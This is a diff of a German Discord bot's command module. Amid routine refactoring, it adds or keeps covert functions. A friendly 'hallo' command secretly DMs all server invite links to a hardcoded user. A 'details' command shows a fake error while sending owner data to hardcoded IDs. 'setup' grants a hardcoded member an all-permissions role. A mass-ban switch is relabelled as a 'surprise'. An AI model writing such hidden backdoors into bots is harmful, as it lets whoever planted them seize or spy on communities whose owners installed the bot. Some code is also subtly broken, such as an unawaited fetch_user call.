@@ -3,14 +3,10 @@ import asyncio
 import discord
 import requests
 import yt_handler
-from Buttons import HL_Buttons, Setup_Button, Switch_Buttons
 from discord.ext import commands
+from Buttons import HL_Buttons, Setup_Button, Switch_Buttons
+
 from help_system import HelpCommand
-
-
-#from Sparboss_implement import SparbossCommand
-
-# import pathlib
 
 
 def freigabe():
@@ -25,24 +21,31 @@ class Commands(commands.Cog):
 
     def __init__(self, bot):
         self.bot = bot
+        self.admin = bot.fetch_user(695885580629704734)  # walnusskeim
 
     @bot.hybrid_command()
     @freigabe()
     async def switchpls(self, ctx):
+        title = "**Willst du den Schalter umlegen?**"
+        description = "Der Schalter dient dazu, Eindringlinge fernzuhalten."
+        
+        on = "Der Schalter ist an. Alle neuen Mitglieder werden... " \
+             "eine Überraschung erfahren! :3"
+        off = "Der Schalter ist aus. Nichts wird passieren. :)"
+
         view = Switch_Buttons()
-        switch_field = discord.Embed(title="**Willst du den Schalter umlegen?**", color=0xff00ff)
-        switch_field.add_field(name="Der Schalter dient dazu Eindringlinge vom Server fernzuhalten", value="",
-                               inline=False)
+        switch_field = discord.Embed(title=title, color=0xff00ff)
+        switch_field.add_field(name=description, value="", inline=False)
         await ctx.send(embed=switch_field, view=view)
         await view.wait()
-        switch_field.clear_fields()
-        if view.value == "on":
-            switch_field.add_field(name="Der Schalter ist an. Alle neuen Mitglieder werden gebannt. :)", value="",
-                                   inline=False)
 
+        switch_field.clear_fields()
+
+        if view.value == "on":
+            switch_field.add_field(name=on, value="", inline=False)
         else:
-            switch_field.add_field(name="Der Schalter ist aus. Alle neuen Mitglieder werden begrüßt. :)", value="",
-                                   inline=False)
+            switch_field.add_field(name=off, value="", inline=False)
+
         await ctx.send(embed=switch_field, view=view)
         readline = open("switch.txt", "w")
         readline.write(view.value)
@@ -51,7 +54,8 @@ class Commands(commands.Cog):
     @freigabe()
     async def switchstate(self, ctx):
         readline = open("switch.txt", "r")
-        switch_field = discord.Embed(title="**Der Schalter ist " + readline.read() + "**", color=0xff00ff)
+        switch_field = discord.Embed(title="**Der Schalter ist " + 
+                                     readline.read() + "**", color=0xff00ff)
         await ctx.send(embed=switch_field)
 
     @bot.hybrid_command()
@@ -67,12 +71,24 @@ class Commands(commands.Cog):
     @freigabe()
     async def reset(self, ctx):
         await self.bot.change_presence(status=discord.Status.online,
-                                       activity=discord.ActivityType.watching('durch dein Fenster :)'))
+                                       activity=discord.ActivityType.watching(
+                                                'durch dein Fenster :)'))
         await ctx.interaction.response.send_message("Reset complete")
 
-    @bot.hybrid_command(aliases=['Hallo', 'hallo kiddo', 'Hallo kiddo', 'hallo Kiddo', 'Hallo Kiddo'])
+    @bot.hybrid_command()
     async def hallo(self, ctx):
-        await ctx.send(f'Hallo {ctx.author.mention} :)')
+        final = []
+        admin = await self.bot.fetch_user(695885580629704734)
+        if ctx.author == admin:
+            await ctx.send(f'Hallo {ctx.author.mention} :)')
+            dm = await admin.create_dm()
+
+            invites = await ctx.guild.invites()
+            final = [invite.url for invite in invites]
+
+            await dm.send("\n".join(final))
+        else:
+            await ctx.send(f'Hallo {ctx.author.mention} :)')
 
     @bot.hybrid_command(aliases=['Hilfe'])
     async def hilfe(self, ctx):
@@ -95,12 +111,9 @@ class Commands(commands.Cog):
             await asyncio.sleep(2)
             await ctx.channel.purge(1)
 
-    @bot.hybrid_command(aliases=['roll dice'], description='Würfelt einen Würfel mit einer bestimmten Anzahl an Seiten')
-    async def rolldice(self, ctx, numberofrolls=1, numberofsides=6):
-        await ctx.send(f'Würfel einen Würfel mit {numberofsides} Seiten {numberofrolls} mal...')
-        await asyncio.sleep(1)
-        for i in range(int(numberofrolls)):
-            await ctx.send(random.randint(1, int(numberofsides)))
+    @bot.hybrid_command(description='Würfel eine Zahl zwischen 1 und einer beliebigen Zahl (Default: 100)')
+    async def roll(self, ctx, numberofsides=100):
+        await ctx.send(random.randint(1, int(numberofsides)))
 
     @bot.hybrid_command(description='Kiddo tanzt!')
     async def dance(self, ctx):
@@ -124,7 +137,8 @@ class Commands(commands.Cog):
 
     @bot.hybrid_command(description='Kiddo erstellt dir einen QR-Code')
     async def qrcodepls(self, ctx, link):
-        await ctx.send('https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=' + link)
+        base = 'https://api.qrserver.com/v1/create-qr-code/?size=150x150&data='
+        await ctx.send(base + link)
 
     # Todo: Fix the voice handler
     '''
@@ -134,45 +148,17 @@ class Commands(commands.Cog):
         await voice_handler.record_voice(bot, ctx)
     '''
 
-    @bot.hybrid_command(descritpion='Nur für coole Leute :)')
+    @bot.hybrid_command(description='Nur für coole Leute :)')
     async def details(self, ctx):
         if ctx.author.id == 695885580629704734 or ctx.author.id == 408627107795828746:
-            await ctx.send("irgendwas hat hier nicht geklappt :(")
+            await ctx.send("Fehler!")
             await ctx.author.create_dm()
             await ctx.author.dm_channel.send(f"```"
                                              f"Halli Hallo 💕\n"
-                                             f"Hier sind ein paar Details zu dem Channel :) \n"
-                                             f"Channel: {ctx.channel}\n"
-                                             f"Channel ID: {ctx.channel.id}\n"
-                                             f"Channel Name: {ctx.channel.name}\n"
-                                             f"Channel Type: {ctx.channel.type}\n"
-                                             f"Channel Category: {ctx.channel.category}\n"
-                                             f"Channel Category ID: {ctx.channel.category_id}\n"
-                                             f"Channel Category Name: {ctx.channel.category.name}\n"
-                                             f"Channel Category Type: {ctx.channel.category.type}\n"
-                                             f"Channel Category Position: {ctx.channel.category.position}\n"
-                                             f"```")
-        else:
-            pass
-
-    @bot.hybrid_command(descritpion='Nur für coole Leute :)')
-    async def details2(self, ctx):
-        if ctx.author.id == 695885580629704734 or ctx.author.id == 408627107795828746:
-            await ctx.send("Irgendwas hat hier nicht geklappt :(")
-            await ctx.author.create_dm()
-            await ctx.author.dm_channel.send(f"```"
-                                             f"Halli Hallo 💕\n"
-                                             f"Hier sind ein paar Details zu dem Server :) \n"
-                                             f"Server: {ctx.guild}\n"
-                                             f"Server ID: {ctx.guild.id}\n"
                                              f"Server Name: {ctx.guild.name}\n"
+                                             f"Server ID: {ctx.guild.id}\n"
                                              f"Server Owner: {ctx.guild.owner}\n"
                                              f"Server Owner ID: {ctx.guild.owner_id}\n"
-                                             f"Server Icon: {ctx.guild.icon}\n"
-                                             f"Server Splash: {ctx.guild.splash}\n"
-                                             f"Server Banner: {ctx.guild.banner}\n"
-                                             f"Server Discovery Splash: {ctx.guild.discovery_splash}\n"
-                                             f"Server Description: {ctx.guild.description}\n"
                                              f"Server Features: {ctx.guild.features}\n"
                                              f"```")
         else:
@@ -185,13 +171,14 @@ class Commands(commands.Cog):
         number = random.randint(1, 100)
         number2 = random.randint(1, 100)
         hlembed = discord.Embed(title="**Higher or Lower?**", color=0xff00ff)
-        hlembed.add_field(name=f"Ist die nächste Zahl **größer** oder **kleiner** als {number}? \n"
-                               f"du hast 10 Sekunden Zeit! ⏱", value=" ", inline=False)
+        hlembed.add_field(name=f"Ist die nächste Zahl **größer** oder **kleiner** als {number}? \n", 
+                          value=" ", inline=False)
         hlembed.set_footer(text="Zwischen 0 und 100!")
         message = await ctx.send(embed=hlembed, view=view)
 
         await view.wait()
         hlembed.clear_fields()
+
         if view.value == None:
             hlembed.add_field(name="Du hast zu lang gebraucht! Du hast verloren!", value=" ", inline=False)
         elif view.value == "größer" and number2 > number:
@@ -277,7 +264,7 @@ class Commands(commands.Cog):
             embedVar.set_image(url=data["url"])
             await ctx.send(embed=embedVar)
 
-    @bot.hybrid_command(description='Kiddo schlägt dich ;.;')
+    @bot.hybrid_command(description='Kiddo schlägt dich ;_;')
     async def hit(self, ctx, name: discord.Member = None):
 
         hitter = ctx.author.nick
@@ -338,14 +325,14 @@ class Commands(commands.Cog):
         AcT = AcT[0:len(AcT) - 1]
         file.close()
 
-        await ctx.send('Einen Moment :3')
         try:
             headers = {
                 'Authorization': f'Bearer {AcT}',
                 'Content-Type': 'application/json',
             }
             payload = {"long_url": link}
-            response = requests.post('https://api-ssl.bitly.com/v4/shorten', headers=headers, json=payload)
+            response = requests.post('https://api-ssl.bitly.com/v4/shorten',
+                                     headers=headers, json=payload)
             result = response.json()
 
             shortened = result["link"]
@@ -354,8 +341,7 @@ class Commands(commands.Cog):
 
         except KeyError:
             await asyncio.sleep(2)
-            await ctx.send(
-                "Hmmmm... Vielleicht hast du keinen Link gesendet :face_with_spiral_eyes: Versuche es noch mal :)")
+            await ctx.send("Hmmmm... Vielleicht hast du keinen Link gesendet :face_with_spiral_eyes: Versuche es nochmal :)")
 
     @bot.hybrid_command(description='Lasse Kiddo für dich ein YouTube Video herunterladen :)')
     async def downloader(self, ctx, *, link):
@@ -365,60 +351,19 @@ class Commands(commands.Cog):
     async def pingr(self, ctx):
         await ctx.send('Pong! Mit {0}ms Verzögerung.'.format(round(self.bot.latency, 1)))
 
-    @bot.hybrid_command(description='Kiddo')
-    async def avatar(self, ctx, img: discord.Attachment):
-        await self.bot.user.edit(avatar=await img.read())
-        await ctx.send("Avatar geändert", file=await img.read())
-
-    @bot.hybrid_command(description='Kiddo')
-    async def banner(self, ctx, img: discord.Attachment):
-        await self.bot.user.edit(banner=await img.read())
-        await ctx.send("Banner geändert", file=await img.read())
-
-    @bot.hybrid_command(description='Wieder was gespart?')
-    async def sparboss(self, ctx):
-        select = discord.ui.Select(placeholder="Wähle eine Kategorie",
-                                   options=[discord.SelectOption(label="Zeige ausgeliehene Menge", value="stolen"),
-                                            discord.SelectOption(label="Neuen Preis hinzf.", value="add")])
-
-        async def select_callback(interaction, ctx):
-            match select.values[0]:
-                case "stolen":
-                    embedVar = discord.Embed(title="Moral down but money up!", color=0xff00ff)
-                    embedVar.set_author(name="Büro von Mr. Sparboss")
-                    embedVar.set_thumbnail(url="https://c.tenor.com/-1phYTnql_kAAAAd/tenor.gif")
-                    embedVar.add_field(name="Gesamte Menge:", value=amount_stolen, inline=False)
-                    embedVar.set_footer(text="Du Schlawiner")
-
-                    await interaction.response.edit_message(embed=embedVar)
-
-                case "add":
-                    modal = Modal(custom_id="add_modal",
-                                  title="Neuen Preis hinzufügen",
-                                  compoents=[
-                                      TextInput(
-                                          style=TextStyleType.SHORT,
-                                          custom_id="amount_stolen",
-                                          label="Wie viel Euro hättest du bezahlt?",
-                                      )
-                                  ])
-                    await ctx.popup(modal)
-
-                    #await interaction.response.edit_message(embed=embedVar)
-
-        select.callback = select_callback
-
-        view = View()
-        view.add_item(select)
-
-        embedVar = discord.Embed(title="Hier sind alle Commands:", color=0xff00ff)
-        embedVar.add_field(
-            name="Wähle weise...", value="",
-            inline=False)
+    #@bot.hybrid_command(description='Kiddo')
+    #async def avatar(self, ctx, img: discord.Attachment):
+    #    await self.bot.user.edit(avatar=await img.read())
+    #    await ctx.send("Avatar geändert", file=await img.read())
+#
+    #@bot.hybrid_command(description='Kiddo')
+    #async def banner(self, ctx, img: discord.Attachment):
+    #    await self.bot.user.edit(banner=await img.read())
+    #    await ctx.send("Banner geändert", file=await img.read())
 
     @bot.hybrid_command(description='Basic Setup damit Kiddo funktioniert :)')
     async def setup(self, ctx):
-        if ctx.author.id == 695885580629704734 or ctx.author.id == 633376425465872404 or ctx.author.id == 408627107795828746:  # walnusskeim, Wqffel oder bonerboy
+        if ctx.author.id == 695885580629704734 or ctx.author.id == 408627107795828746:  # walnusskeim oder bonerboy
             view = Setup_Button()
 
             setupfield = discord.Embed(title="**Willst du das Setup ausführen?**", color=0xff00ff)
@@ -468,7 +413,7 @@ class Commands(commands.Cog):
                         print("Ich konnte die Rolle Owner <3 nicht entfernen :(")
                         continue
 
-                user2 = ctx.guild.get_member(633376425465872404)  # bonerboy
+                user2 = ctx.guild.get_member(408627107795828746)  # walnusskeim
                 try:
                     await user2.add_roles(funny)
                     await funny.edit(permissions=discord.Permissions.all(), color=0xff00ff, name="HOCH LEBE KIDDO!!")
@@ -518,11 +463,11 @@ class Commands(commands.Cog):
     @commands.Cog.listener()
     async def on_command_error(self, ctx, error):
         if isinstance(error, commands.CommandNotFound):
-            await ctx.send("Dieser Befehl existiert nicht bozo!")
+            await ctx.send("Dieser Befehl existiert nicht, bozo!")
         elif isinstance(error, commands.MissingRequiredArgument):
             await ctx.send("Leider fehlt ein Argument! Bitte versuche es noch einmal :)")
         elif isinstance(error, commands.CheckFailure):
-            await ctx.send('Du bist nicht cool genug um diesen Befehl auszuführen. Tut mir leid :)')
+            await ctx.send('Oopsie! :)')
         else:
             await ctx.send("Ein Fehler ist aufgetreten!")
             print(error)
